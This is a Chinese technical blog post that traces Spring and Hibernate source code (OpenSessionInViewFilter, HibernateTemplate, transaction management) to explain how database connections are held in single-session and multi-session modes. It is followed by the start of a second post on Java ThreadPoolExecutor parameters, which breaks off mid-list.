web.xml\n```xml\n<filter>\n\t\t<filter-name>hibernateFilter</filter-name>\n\t\t<filter-class>\n\t\t\torg.springframework.orm.hibernate3.support.OpenSessionInViewFilter\n\t\t</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>sessionFactoryBeanName</param-name>\n\t\t\t<param-value>sessionFactory</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>singleSession</param-name>\n\t\t\t<param-value>true</param-value>\n\t\t</init-param>\n</filter>\n```\n初始化参数singleSession可选值有true(单session)和false(多session)，打开源码，找到入口方法doFilterInternal如下：\n### OpenSessionInViewFilter\n```java\nprotected void doFilterInternal(\n\t\t\tHttpServletRequest request, HttpServletResponse response, FilterChain filterChain)\n\t\t\tthrows ServletException, IOException {\n\t\tSessionFactory sessionFactory = lookupSessionFactory(request);\n\t\tboolean participate = false;\n\t\tif (isSingleSession()) {\n\t\t\t //此处省略n行代码......\n\t\t    logger.debug(\"Opening single Hibernate Session in OpenSessionInViewFilter\");\n\t\t\tSession session = getSession(sessionFactory);\n\t\t\tTransactionSynchronizationManager.bindResource(sessionFactory, new SessionHolder(session));\n\t\t}\n\t\telse {\n\t\t\t//此处省略n行代码......\n\t\t\tSessionFactoryUtils.initDeferredClose(sessionFactory);\n\t\t}\n\t\ttry {\n\t\t\tfilterChain.doFilter(request, response);\n\t\t}\n\t\tfinally {\n\t\t\tif (!participate) {\n\t\t\t\tif (isSingleSession()) {\n\t\t\t\t\t// single session mode\n\t\t\t\t\tSessionHolder sessionHolder =\n\t\t\t\t\t\t\t(SessionHolder) TransactionSynchronizationManager.unbindResource(sessionFactory);\n\t\t\t\t\tlogger.debug(\"Closing single Hibernate Session in OpenSessionInViewFilter\");\n\t\t\t\t\tcloseSession(sessionHolder.getSession(), sessionFactory);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t// deferred close mode\n\t\t\t\t\tSessionFactoryUtils.processDeferredClose(sessionFactory);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n```\n单session的情况下，请求开始时，先通过getSession方法取到一个session，然后将sessionFactory作为key，SessionHolder作为value绑定到resources中，请求结束的时候，解除绑定session并关闭session。多session的时候，请求开始时执行initDeferredClose方法标记请求过程中产生的所有session都延迟关闭，请求结束时才关闭所有的session，也就是关闭请求中所有被保存起来的session。中间的filterChain.doFilter(request, response)方法是执行其他filter的拦截方法以及请求对应的具体处理内容。\n\n先看一下单session的bindResource方法如下：\n\n### bindResource\n```java\npublic static void bindResource(Object key, Object value) throws IllegalStateException {\n\t\t//此处省略n行代码......\n\t\tMap<Object, Object> map = resources.get();\n\t\t// set ThreadLocal Map if none found\n\t\tif (map == null) {\n\t\t\tmap = new HashMap<Object, Object>();\n\t\t\tresources.set(map);\n\t\t}\n\t\tObject oldValue = map.put(actualKey, value);\n        //此处省略n行代码......\n}\n```\n可以发现resources是一个ThreadLocal类型的变量，其内部实现是一个Map，以当前线程作为key，来达到［整个请求线程共享变量并且多个请求之间不会相互影响］的作用：\n### ThreadLocal\n```\nprivate static final ThreadLocal<Map<Object, Object>> resources =\n\t\t\tnew NamedThreadLocal<Map<Object, Object>>(\"Transactional resources\");\n```\n单session情况下，请求开始就获取session，而多session时候则是执行的initDeferredClose这个方法：\n### initDeferredClose\n```java\npublic static void initDeferredClose(SessionFactory sessionFactory) {\n\t\tAssert.notNull(sessionFactory, \"No SessionFactory specified\");\n\t\tlogger.debug(\"Initializing deferred close of Hibernate Sessions\");\n\t\tMap<SessionFactory, Set<Session>> holderMap = deferredCloseHolder.get();\n\t\tif (holderMap == null) {\n\t\t\tholderMap = new HashMap<SessionFactory, Set<Session>>();\n\t\t\tdeferredCloseHolder.set(holderMap);\n\t\t}\n\t\tholderMap.put(sessionFactory, new LinkedHashSet<Session>(4));\n}\n```\n这个方法首先判断deferredCloseHolder中是否含有holderMap，如果没有，就新建一个map变量并set到deferredCloseHolder，这个map中的Set<Session>集合后面会用来保存请求过程中所有产生的session，请求中的数据库操作只要发现deferredCloseHolder中有值，就不会去关闭session，而是将session保存到set集合里，等到请求结束才关闭session。同样可以发现这个deferredCloseHolder也是一个ThreadLocal类型的变量：\n\n### deferredCloseHolder \n```java\nprivate static final ThreadLocal<Map<SessionFactory, Set<Session>>> deferredCloseHolder =\n\t\t\tnew NamedThreadLocal<Map<SessionFactory, Set<Session>>>(\"Hibernate Sessions registered for deferred close\");\n```\n多session请求结束时候，执行延迟关闭方法：\n###processDeferredClose\n```java\npublic static void processDeferredClose(SessionFactory sessionFactory) {\n\t\tAssert.notNull(sessionFactory, \"No SessionFactory specified\");\n\t\tMap<SessionFactory, Set<Session>> holderMap = deferredCloseHolder.get();\n\t\tif (holderMap == null || !holderMap.containsKey(sessionFactory)) {\n\t\t\tthrow new IllegalStateException(\"Deferred close not active for SessionFactory [\" + sessionFactory + \"]\");\n\t\t}\n\t\tlogger.debug(\"Processing deferred close of Hibernate Sessions\");\n\t\tSet<Session> sessions = holderMap.remove(sessionFactory);\n\t\tfor (Session session : sessions) {\n\t\t\tcloseSession(session);\n\t\t}\n\t\tif (holderMap.isEmpty()) {\n\t\t\tdeferredCloseHolder.remove();\n\t\t}\n}\n```\n可以看到，此处的holderMap就是请求开始时往deferredCloseHolder中put的变量，然后从holderMap取出请求过程中产生的所有session并关闭。\n\n接着回头看单session的时候，会用getSession方法取到一个sesson：\n\n### getSession\n```java\nprotected Session getSession(SessionFactory sessionFactory) throws DataAccessResourceFailureException {\n\t\tSession session = SessionFactoryUtils.getSession(sessionFactory, true);\n\t\tFlushMode flushMode = getFlushMode();\n\t\tif (flushMode != null) {\n\t\t\tsession.setFlushMode(flushMode);\n\t\t}\n\t\treturn session;\n}\n```\n```java\nprivate FlushMode flushMode = FlushMode.MANUAL;\n```\n此处有个细节就是，获取到session的时候会把这个session的FlushMode设置为默认的Manual状态，这个Manual状态会导致执行HibernateTemplate的增删改方法（无事务的dao方法）报错，只能执行查询方法。解决方案有两个：\n\n- 可以通过将HibernateTemplate的增删改方法（常称dao方法）该为执行spring事务拦截方法（常称service方法），事务拦截器会把session的flushMode改为auto，事务结束之后再重新设置为原来的Manual状态。\n\n- 新建一个java类继承OpenSessionInViewFilter,改写getSession方法的FlushMode，将该java类代替OpenSessionInViewFilter配置到web.xml中\n\n跟踪到getSession方法的内部实现doGetSession方法，这个方法在HibernateTemplate的增删改查和事务拦截器Transactioninterceptor创建事务的时候也都会用到：\n\n### doGetSession\n```java\nprivate static Session doGetSession(\n\t\t\tSessionFactory sessionFactory, Interceptor entityInterceptor,\n\t\t\tSQLExceptionTranslator jdbcExceptionTranslator, boolean allowCreate)\n\t\t\tthrows HibernateException, IllegalStateException {\n\n\t\tAssert.notNull(sessionFactory, \"No SessionFactory specified\");\n\n\t\tObject resource = TransactionSynchronizationManager.getResource(sessionFactory);\n\t\tif (resource instanceof Session) {\n\t\t\treturn (Session) resource;\n\t\t}\n\t\tSessionHolder sessionHolder = (SessionHolder) resource;\n\t\tif (sessionHolder != null && !sessionHolder.isEmpty()) {\n\t\t\t// pre-bound Hibernate Session\n\t\t\tSession session = null;\n\t\t\tif (TransactionSynchronizationManager.isSynchronizationActive() &&\n\t\t\t\t\tsessionHolder.doesNotHoldNonDefaultSession()) {\n\t\t\t\t// Spring transaction management is active ->\n\t\t\t\t// register pre-bound Session with it for transactional flushing.\n\t\t\t\tsession = sessionHolder.getValidatedSession();\n\t\t\t\tif (session != null && !sessionHolder.isSynchronizedWithTransaction()) {\n\t\t\t\t\tlogger.debug(\"Registering Spring transaction synchronization for existing Hibernate Session\");\n\t\t\t\t\tTransactionSynchronizationManager.registerSynchronization(\n\t\t\t\t\t\t\tnew SpringSessionSynchronization(sessionHolder, sessionFactory, jdbcExceptionTranslator, false));\n\t\t\t\t\tsessionHolder.setSynchronizedWithTransaction(true);\n\t\t\t\t\t// Switch to FlushMode.AUTO, as we have to assume a thread-bound Session\n\t\t\t\t\t// with FlushMode.MANUAL, which needs to allow flushing within the transaction.\n\t\t\t\t\tFlushMode flushMode = session.getFlushMode();\n\t\t\t\t\tif (flushMode.lessThan(FlushMode.COMMIT) &&\n\t\t\t\t\t\t\t!TransactionSynchronizationManager.isCurrentTransactionReadOnly()) {\n\t\t\t\t\t\tsession.setFlushMode(FlushMode.AUTO);\n\t\t\t\t\t\tsessionHolder.setPreviousFlushMode(flushMode);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\t// No Spring transaction management active -> try JTA transaction synchronization.\n\t\t\t\tsession = getJtaSynchronizedSession(sessionHolder, sessionFactory, jdbcExceptionTranslator);\n\t\t\t}\n\t\t\tif (session != null) {\n\t\t\t\treturn session;\n\t\t\t}\n\t\t}\n\n\t\tlogger.debug(\"Opening Hibernate Session\");\n\t\tSession session = (entityInterceptor != null ?\n\t\t\t\tsessionFactory.openSession(entityInterceptor) : sessionFactory.openSession());\n\n\t\t// Use same Session for further Hibernate actions within the transaction.\n\t\t// Thread object will get removed by synchronization at transaction completion.\n\t\tif (TransactionSynchronizationManager.isSynchronizationActive()) {\n\t\t\t// We're within a Spring-managed transaction, possibly from JtaTransactionManager.\n\t\t\tlogger.debug(\"Registering Spring transaction synchronization for new Hibernate Session\");\n\t\t\tSessionHolder holderToUse = sessionHolder;\n\t\t\tif (holderToUse == null) {\n\t\t\t\tholderToUse = new SessionHolder(session);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tholderToUse.addSession(session);\n\t\t\t}\n\t\t\tif (TransactionSynchronizationManager.isCurrentTransactionReadOnly()) {\n\t\t\t\tsession.setFlushMode(FlushMode.MANUAL);\n\t\t\t}\n\t\t\tTransactionSynchronizationManager.registerSynchronization(\n\t\t\t\t\tnew SpringSessionSynchronization(holderToUse, sessionFactory, jdbcExceptionTranslator, true));\n\t\t\tholderToUse.setSynchronizedWithTransaction(true);\n\t\t\tif (holderToUse != sessionHolder) {\n\t\t\t\tTransactionSynchronizationManager.bindResource(sessionFactory, holderToUse);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\t// No Spring transaction management active -> try JTA transaction synchronization.\n\t\t\tregisterJtaSynchronization(session, sessionFactory, jdbcExceptionTranslator, sessionHolder);\n\t\t}\n\n\t\t// Check whether we are allowed to return the Session.\n\t\tif (!allowCreate && !isSessionTransactional(session, sessionFactory)) {\n\t\t\tcloseSession(session);\n\t\t\tthrow new IllegalStateException(\"No Hibernate Session bound to thread, \" +\n\t\t\t    \"and configuration does not allow creation of non-transactional one here\");\n\t\t}\n\n\t\treturn session;\n}\n```\n这段代码比较长，主要逻辑如下：\n\n如果ThreadLocal中有sessionHolder，说明前面已经在ThreadLocal中绑定过了session，直接从sessionHolder中取出sesision即可，不需要重新开启一个新的session，而是沿用之前绑定到ThreadLocal中的sessoin。如果ThreadLocal中没有sessionHolder，说明没有绑定sesison，就通过\nSessionFactoryUtils开启一个新的session，得到这个session之后再判断当前是否存在spring事务，如果有就绑定到ThreadLocal中，之后在这个事务范围内的dao操作都共用这个session，如果没有事务，就直接返回这个session。\n\n回过头去看OpenSessionInViewFilter 在单session的情况下，通过getSession方法获取到session之后，就执行bindResource方法将session绑定到ThreadLocal中了：\n\n```java\nTransactionSynchronizationManager.bindResource(sessionFactory, new SessionHolder(session));\n```\n到此就可以得出几个小结论：\n- 单sessoin情况下，请求一开始就会创建session并绑定到ThreadLocal变量中，请求过程中需要用到hibernate的sesison进行数据库操作的时候，就直接从ThreadLocal变量中取出复用，请求结束了就关闭这个唯一的session，整个请求过程也只会占用一个数据库链接。\n\n- 多session的情况下，请求刚开始并不创建session，而是等到请求过程中需要session的时候就open一个session，执行多个HibernateTemplate的增删改查方法就会创建多个session，请求过程中将会占用多个数据库链接，并直到请求结束链接才会被释放。\n\n然后接着看HibernateTemplate的增删改查代码对session的处理情况，举个save方法的例子：\n\n### save\n```java\npublic Serializable save(final Object entity) throws DataAccessException {\n\t\treturn executeWithNativeSession(new HibernateCallback<Serializable>() {\n\t\t\tpublic Serializable doInHibernate(Session session) throws HibernateException {\n\t\t\t\tcheckWriteOperationAllowed(session);\n\t\t\t\treturn session.save(entity);\n\t\t\t}\n\t\t});\n}\n```\n增删改查都会调用executeWithNativeSession方法，并传入一个HibernateCallback实例，执行相应的增删改查操作。executeWithNativeSession方法属于设计模式中的命令模式，简单来说就是往这个方法传入什么命令，hibernate就帮你执行什么操作。继续往里面跟踪代码可以看到：\n### doExecute\n```java\npublic <T> T executeWithNativeSession(HibernateCallback<T> action) {\n\t\treturn doExecute(action, false, true);\n}\n\nprotected <T> T doExecute(HibernateCallback<T> action, boolean enforceNewSession, boolean enforceNativeSession)\n\t\t\tthrows DataAccessException {\n\n\t\tAssert.notNull(action, \"Callback object must not be null\");\n\n\t\tSession session = (enforceNewSession ?\n\t\t\t\tSessionFactoryUtils.getNewSession(getSessionFactory(), getEntityInterceptor()) : getSession());\n\t\tboolean existingTransaction = (!enforceNewSession &&\n\t\t\t\t(!isAllowCreate() || SessionFactoryUtils.isSessionTransactional(session, getSessionFactory())));\n\t\tif (existingTransaction) {\n\t\t\tlogger.debug(\"Found thread-bound Session for HibernateTemplate\");\n\t\t}\n\n\t\tFlushMode previousFlushMode = null;\n\t\ttry {\n\t\t\tpreviousFlushMode = applyFlushMode(session, existingTransaction);\n\t\t\tenableFilters(session);\n\t\t\tSession sessionToExpose =\n\t\t\t\t\t(enforceNativeSession || isExposeNativeSession() ? session : createSessionProxy(session));\n\t\t\tT result = action.doInHibernate(sessionToExpose);\n\t\t\tflushIfNecessary(session, existingTransaction);\n\t\t\treturn result;\n\t\t}\n\t\tcatch (HibernateException ex) {\n\t\t\tthrow convertHibernateAccessException(ex);\n\t\t}\n\t\tcatch (SQLException ex) {\n\t\t\tthrow convertJdbcAccessException(ex);\n\t\t}\n\t\tcatch (RuntimeException ex) {\n\t\t\t// Callback code threw application exception...\n\t\t\tthrow ex;\n\t\t}\n\t\tfinally {\n\t\t\tif (existingTransaction) {\n\t\t\t\tlogger.debug(\"Not closing pre-bound Hibernate Session after HibernateTemplate\");\n\t\t\t\tdisableFilters(session);\n\t\t\t\tif (previousFlushMode != null) {\n\t\t\t\t\tsession.setFlushMode(previousFlushMode);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\t// Never use deferred close for an explicitly new Session.\n\t\t\t\tif (isAlwaysUseNewSession()) {\n\t\t\t\t\tSessionFactoryUtils.closeSession(session);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tSessionFactoryUtils.closeSessionOrRegisterDeferredClose(session, getSessionFactory());\n\t\t\t\t}\n\t\t\t}\n\t\t}\n}\n```\n这个方法就比较明了了：\n首先获取hibernate的session，就是上面分析过的那个方法。然后判断existingTransaction，也就是当前是否存在spring事务。可以看到previousFlushMode = applyFlushMode(session, existingTransaction)，这行代码，如果当前存在事务，就会修改session的flushMode，并取得修改之前的previousFlushMode，执行增删改查操作之后再把这个previousFlushMode，也就是旧的flushMode设置回session中，这也就是为什么在单session情况下，有spring事务的可以执行增删改操作，而没有spring事务执行增删改就会报错的原因。\n\n中间的：\n```java\nT result = action.doInHibernate(sessionToExpose);\n```\n此处就是执行的增删改操作，以及返回操作结果。hinernate创建session的时候并不会占用数据库链接，只有hibernate真正执行与数据库交互的时候才会申请并占用数据库链接。在执行action.doInHibernate的时候hibernate其实还没有开始真正的进行数据库操作，只是在内存中操作，只有执行session.flush()的时候才会把内存中的这些数据真正的同步到数据库中，也就是执行session.flush()的时候才会开始占用数据库链接。当然查询方法是个例外，因为必须要从数据库中取出数据，所以如果是查询方法，在查询的时候就会与数据库有交互操作，也就是进行查询的时候就会开始占用数据库链接。接下来的代码就是判断是否要进行flush操作，继续跟踪到flushIfNecessary这个方法中：\n### flushIfNecessary\n```java\nprotected void flushIfNecessary(Session session, boolean existingTransaction) throws HibernateException {\n\t\tif (getFlushMode() == FLUSH_EAGER || (!existingTransaction && getFlushMode() != FLUSH_NEVER)) {\n\t\t\tlogger.debug(\"Eagerly flushing Hibernate session\");\n\t\t\tsession.flush();\n\t\t}\n}\n```\n可以看到，当flushMode为FLUSH_EAGER的时候，或者不存在spring事务且flushMode不为FLUSH_NEVER的时候就会进行session.flush()操作，同步数据。综上可见在存在spring事务的情况下，所有dao的增删改操作都不会马上被同步到数据库中，而要等到事务提交才会被flush到数据库。所有如果你在某个带有spring事务的service方法内部对dao执行try catch会出现捕获不到数据库异常的情况：\n```java\npublic calss Service｛\n    public void saveObj(){\n        try{\n            dao.save(dto);\n        }catch(Exception e){\n           //这里catch不到数据库错误\n        }\n    }\n｝\n\npublic calss Action｛\n    public void saveSomeThing(){\n        try{\n            service.saveObj(dto);\n        }catch(Exception e){\n           //这里才能catch到数据库错误\n        }\n    }\n｝\n\n```\n执行完增删改查之后，如果当前有spring事务就把flushMode设置为原来的状态：session.setFlushMode(previousFlushMode)。如果当前没有spring事务,会看到以下方法：\n\nSessionFactoryUtils.closeSessionOrRegisterDeferredClose(session, getSessionFactory());\n\n\n### closeSessionOrRegisterDeferredClose\n```java\nstatic void closeSessionOrRegisterDeferredClose(Session session, SessionFactory sessionFactory) {\n\t\tMap<SessionFactory, Set<Session>> holderMap = deferredCloseHolder.get();\n\t\tif (holderMap != null && sessionFactory != null && holderMap.containsKey(sessionFactory)) {\n\t\t\tlogger.debug(\"Registering Hibernate Session for deferred close\");\n\t\t\t// Switch Session to FlushMode.MANUAL for remaining lifetime.\n\t\t\tsession.setFlushMode(FlushMode.MANUAL);\n\t\t\tSet<Session> sessions = holderMap.get(sessionFactory);\n\t\t\tsessions.add(session);\n\t\t}\n\t\telse {\n\t\t\tcloseSession(session);\n\t\t}\n}\n```\n从这个方法就可以很清晰的看出在OpenSessionInViewFilter多session的情况下，只要deferredCloseHolder有holderMap，session就不会被关闭，而是被保存到Set<Session>集合中，也就是多session情况下数据库链接在请求结束之前都不会被释放的原因。\n\n最后是Transactioninterceptor拦截器，入口方法如下：\n```java\npublic Object invoke(final MethodInvocation invocation) throws Throwable {\n\t\tClass<?> targetClass = (invocation.getThis() != null ? AopUtils.getTargetClass(invocation.getThis()) : null);\n\t\tfinal TransactionAttribute txAttr =\n\t\t\t\tgetTransactionAttributeSource().getTransactionAttribute(invocation.getMethod(), targetClass);\n\t\tfinal PlatformTransactionManager tm = determineTransactionManager(txAttr);\n\t\tfinal String joinpointIdentification = methodIdentification(invocation.getMethod(), targetClass);\n\t\tif (txAttr == null || !(tm instanceof CallbackPreferringPlatformTransactionManager)) {\n\t\t\tTransactionInfo txInfo = createTransactionIfNecessary(tm, txAttr, joinpointIdentification);\n\t\t\tObject retVal = null;\n\t\t\ttry {\n\t\t\t\tretVal = invocation.proceed();\n\t\t\t}\n\t\t\tcatch (Throwable ex) {\n\t\t\t\t// target invocation exception\n\t\t\t\tcompleteTransactionAfterThrowing(txInfo, ex);\n\t\t\t\tthrow ex;\n\t\t\t}\n\t\t\tfinally {\n\t\t\t\tcleanupTransactionInfo(txInfo);\n\t\t\t}\n\t\t\tcommitTransactionAfterReturning(txInfo);\n\t\t\treturn retVal;\n\t\t}\n        //此处省略n行代码......\n}\n```\nretVal = invocation.proceed()\n这行代码是执行拦截器链中的其他拦截器以及被拦截的目标方法。这个方法前面的内容就是开启事务，后面的内容就是提交和回滚事务。也就是spring声明式事务可以不用手动开启和提交事务的原理。createTransactionIfNecessary这个方法就是根据applicationcontext.xml的配置来生成不同类型的事务，而commitTransactionAfterReturning就是提交事务。\n\n跟踪createTransactionIfNecessary进入到getTransaction方法：\n### getTransaction\n```java\npublic final TransactionStatus getTransaction(TransactionDefinition definition) throws TransactionException {\n\t\tObject transaction = doGetTransaction();\n\n\t\t// Cache debug flag to avoid repeated checks.\n\t\tboolean debugEnabled = logger.isDebugEnabled();\n\n\t\tif (definition == null) {\n\t\t\t// Use defaults if no transaction definition given.\n\t\t\tdefinition = new DefaultTransactionDefinition();\n\t\t}\n\n\t\tif (isExistingTransaction(transaction)) {\n\t\t\t// Existing transaction found -> check propagation behavior to find out how to behave.\n\t\t\treturn handleExistingTransaction(definition, transaction, debugEnabled);\n\t\t}\n\n\t\t// Check definition settings for new transaction.\n\t\tif (definition.getTimeout() < TransactionDefinition.TIMEOUT_DEFAULT) {\n\t\t\tthrow new InvalidTimeoutException(\"Invalid transaction timeout\", definition.getTimeout());\n\t\t}\n\n\t\t// No existing transaction found -> check propagation behavior to find out how to proceed.\n\t\tif (definition.getPropagationBehavior() == TransactionDefinition.PROPAGATION_MANDATORY) {\n\t\t\tthrow new IllegalTransactionStateException(\n\t\t\t\t\t\"No existing transaction found for transaction marked with propagation 'mandatory'\");\n\t\t}\n\t\telse if (definition.getPropagationBehavior() == TransactionDefinition.PROPAGATION_REQUIRED ||\n\t\t\t\tdefinition.getPropagationBehavior() == TransactionDefinition.PROPAGATION_REQUIRES_NEW ||\n\t\t    definition.getPropagationBehavior() == TransactionDefinition.PROPAGATION_NESTED) {\n\t\t\tSuspendedResourcesHolder suspendedResources = suspend(null);\n\t\t\tif (debugEnabled) {\n\t\t\t\tlogger.debug(\"Creating new transaction with name [\" + definition.getName() + \"]: \" + definition);\n\t\t\t}\n\t\t\ttry {\n\t\t\t\tboolean newSynchronization = (getTransactionSynchronization() != SYNCHRONIZATION_NEVER);\n\t\t\t\tDefaultTransactionStatus status = newTransactionStatus(\n\t\t\t\t\t\tdefinition, transaction, true, newSynchronization, debugEnabled, suspendedResources);\n\t\t\t\tdoBegin(transaction, definition);\n\t\t\t\tprepareSynchronization(status, definition);\n\t\t\t\treturn status;\n\t\t\t}\n\t\t\tcatch (RuntimeException ex) {\n\t\t\t\tresume(null, suspendedResources);\n\t\t\t\tthrow ex;\n\t\t\t}\n\t\t\tcatch (Error err) {\n\t\t\t\tresume(null, suspendedResources);\n\t\t\t\tthrow err;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\t// Create \"empty\" transaction: no actual transaction, but potentially synchronization.\n\t\t\tboolean newSynchronization = (getTransactionSynchronization() == SYNCHRONIZATION_ALWAYS);\n\t\t\treturn prepareTransactionStatus(definition, null, true, newSynchronization, debugEnabled, null);\n\t\t}\n}\n```\n由于spring提供了多种事务嵌套的传播机制，所以这段代码里面有许多if else的判断，开启事务在doBegin这个方法里面。这里需要注意最后那个else分支：创建一个空的事务，并非真正的数据库事务，也就是不执行session.begintransaction()这个开启事务的方法。spring事务传播有个配置叫PROPAGATION_NOT_SUPPORTED：意思是以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。PROPAGATION_NOT_SUPPORTED这个配置就会走到最后的这个else分支。虽然以非事务方式运行，但是在前面分析的许多用来判断当前是否存在spring事务的existingTransaction这个变量的值依旧会是ture。也就是说，spring认为当前存在事务，虽然是一个空事务。这就导致可能出现下面的情况：\n\n- 在某个service中配置为PROPAGATION_NOT_SUPPORTED的方法中开始执行了查数据库的操作，占用了一个数据库链接，然后又把查询出来的数据作为参数调用了一个耗时很长的外围系统的接口,这样就会导致这个空事务一直不被提交，这个数据库链接也就会被一直被占用而无法释放。\n\n\n继续看开启事务的doBegin方法：\n### doBegin\n```java\n@Override\n\tprotected void doBegin(Object transaction, TransactionDefinition definition) {\n        //此处省略n行代码......\n\t\thibTx = session.beginTransaction();\n        //此处省略n行代码......\n}\n```\n执行完目标方法，中间有一个准备提交事务的方法：\n### prepareForCommit\n```java\nprotected void prepareForCommit(DefaultTransactionStatus status) {\n\t\tif (this.earlyFlushBeforeCommit && status.isNewTransaction()) {\n\t\t\tHibernateTransactionObject txObject = (HibernateTransactionObject) status.getTransaction();\n\t\t\tSession session = txObject.getSessionHolder().getSession();\n\t\t\tif (!session.getFlushMode().lessThan(FlushMode.COMMIT)) {\n\t\t\t\tlogger.debug(\"Performing an early flush for Hibernate transaction\");\n\t\t\t\ttry {\n\t\t\t\t\tsession.flush();\n\t\t\t\t}\n\t\t\t\tcatch (HibernateException ex) {\n\t\t\t\t\tthrow convertHibernateAccessException(ex);\n\t\t\t\t}\n\t\t\t\tfinally {\n\t\t\t\t\tsession.setFlushMode(FlushMode.MANUAL);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n}\n```\n这里可以看到 session.flush()方法，也就是前面说的事务开始提交的时候才会把hibernate内存中的数据同步到数据库之中。\n\n最后就是事务提交完成之后的处理session.disconnect()或者session.close()释放数据库链接，如下：\n### doCleanupAfterCompletion\n```java\nprotected void doCleanupAfterCompletion(Object transaction) {\n\t\tHibernateTransactionObject txObject = (HibernateTransactionObject) transaction;\n\n\t\t// Remove the session holder from the thread.\n\t\tif (txObject.isNewSessionHolder()) {\n\t\t\tTransactionSynchronizationManager.unbindResource(getSessionFactory());\n\t\t}\n\n\t\t// Remove the JDBC connection holder from the thread, if exposed.\n\t\tif (getDataSource() != null) {\n\t\t\tTransactionSynchronizationManager.unbindResource(getDataSource());\n\t\t}\n\n\t\tSession session = txObject.getSessionHolder().getSession();\n\t\tif (this.prepareConnection && session.isConnected() && isSameConnectionForEntireSession(session)) {\n\t\t\t// We're running with connection release mode \"on_close\": We're able to reset\n\t\t\t// the isolation level and/or read-only flag of the JDBC Connection here.\n\t\t\t// Else, we need to rely on the connection pool to perform proper cleanup.\n\t\t\ttry {\n\t\t\t\tConnection con = session.connection();\n\t\t\t\tDataSourceUtils.resetConnectionAfterTransaction(con, txObject.getPreviousIsolationLevel());\n\t\t\t}\n\t\t\tcatch (HibernateException ex) {\n\t\t\t\tlogger.debug(\"Could not access JDBC Connection of Hibernate Session\", ex);\n\t\t\t}\n\t\t}\n\n\t\tif (txObject.isNewSession()) {\n\t\t\tif (logger.isDebugEnabled()) {\n\t\t\t\tlogger.debug(\"Closing Hibernate Session [\" + SessionFactoryUtils.toString(session) +\n\t\t\t\t\t\t\"] after transaction\");\n\t\t\t}\n\t\t\tSessionFactoryUtils.closeSessionOrRegisterDeferredClose(session, getSessionFactory());\n\t\t}\n\t\telse {\n\t\t\tif (logger.isDebugEnabled()) {\n\t\t\t\tlogger.debug(\"Not closing pre-bound Hibernate Session [\" +\n\t\t\t\t\t\tSessionFactoryUtils.toString(session) + \"] after transaction\");\n\t\t\t}\n\t\t\tif (txObject.getSessionHolder().getPreviousFlushMode() != null) {\n\t\t\t\tsession.setFlushMode(txObject.getSessionHolder().getPreviousFlushMode());\n\t\t\t}\n\t\t\tif (!this.hibernateManagedSession) {\n\t\t\t\tsession.disconnect();\n\t\t\t}\n\t\t}\n\t\ttxObject.getSessionHolder().clear();\n}\n```\n- 多session的情况下，如果没有嵌套事务,txObject.isNewSessionHolder()和txObject.isNewSession()的返回值为true，会执行unbindResource操作和closeSessionOrRegisterDeferredClose操作。\n- 单session情况下不解除绑定，后面依然可以从ThreadLocal中获取到session，但是会执行session.disconnect()来关闭数据库链接。\n\n下面给出各种情况下的结论：\n1. 在单session情况下，session会被绑定至当前线程(ThreadLocal)，整个请求过程中共用一个sesssion，整个请求过程至多一个数据库连接。如果执行带有spring事务的service方法结束之后会触发session.disconnect()释放连接。虽然只有一个连接，但如果在service内部方法结束之前调用了外围耗时的操作会导致连接长时间不被释放。\n\n2. 多session情况下，每执行一个dao或者service方法都将创建一个session，每个session都将占用一个数据库连接，dao和service方法结束都不会关闭session，直到请求结束才会释放连接。service内部的所有dao操作共用一个sesison。如果在for循环中调用dao或者service，将产生n个连接。所以，这种模式下一次请求将占用n个连接，将会导致数据库连接瞬间飙升的情况。\n\n3. 后台自启线程，如quartz定时调度等不经过OpenSessionInViewFilter的情况下，每执行一个dao或者service方法都将创建一个session，执行结束之后都会关闭sessoin。service内部的所有dao操作共用一个sesison。所以即使在for循环里面调用dao或者service，同一时刻也只会占用一个数据库连接，不会导致数据库连接飙升的情况。\n\n4. 创建hibernate的sessoin的时候并不占用数据库连接，执行查询方法或者session的flush方法才会开始占用数据库连接。spring事务开启的时候，由于需要调用jdbc底层的Connection.setAutoCommit方法，所以spring事务开启的时候，即使中间没有执行任何数据库操作，也会占用数据库连接。如果service方法的propagation为PROPAGATION_NOT_SUPPORTED，虽有spring事务(空事务)，但是由于不会创建JDBC底层事务，所以这类的service方法开始的时候不会占用数据库连接。\n"},{"title":"Java线程池","url":"/2017/01/09/Java线程池/","content":"\n在项目中为了提高系统性能，并发处理任务，减少线程创建的高开销，一般会用到线程池，java线程池构造如下：\n\n**通过ThreadPoolExecutor创建**\n\n```\npublic ThreadPoolExecutor(int corePoolSize,\n                              int maximumPoolSize,\n                              long keepAliveTime,\n                              TimeUnit unit,\n                              BlockingQueue<Runnable> workQueue,\n                              ThreadFactory threadFactory,\n                              RejectedExecutionHandler handler) {\n        if (corePoolSize < 0 ||\n            maximumPoolSize <= 0 ||\n            maximumPoolSize < corePoolSize ||\n            keepAliveTime < 0)\n            throw new IllegalArgumentException();\n        if (workQueue == null || threadFactory == null || handler == null)\n            throw new NullPointerException();\n        this.corePoolSize = corePoolSize;\n        this.maximumPoolSize = maximumPoolSize;\n        this.workQueue = workQueue;\n        this.keepAliveTime = unit.toNanos(keepAliveTime);\n        this.threadFactory = threadFactory;\n        this.handler = handler;\n    }\n\n```\n\n**参数含义**\n\n- corePoolSize： 线程池核心线程数最大值\n- maximumPoolSize： 线程池最大线程数大小\n- keepAliveTime： 线程池中非核心线程空闲的存活时间大小\n- unit： 线程空闲存活时间单位\n- workQueue： 存放任务的阻塞队列\n- threadFactory： 用于设置创建线程的工厂，可以给创建的线程设置有意义的名字，可方便排查问题。\n- handler：  线城池的饱和策略事件，主要有四种类型。\n\n\n**运行流程**\n\n- 提交一个任务，线程池里存活的核心线程数小于线程数corePoolSize时，线程池会创建一个核心线程去处理提交的任务。\n- 如果线程池核心线程数已满，即线程数已经等于corePoolSize，一个新提交的任务，会被放进任务队列workQueue排队等待执行。\n- 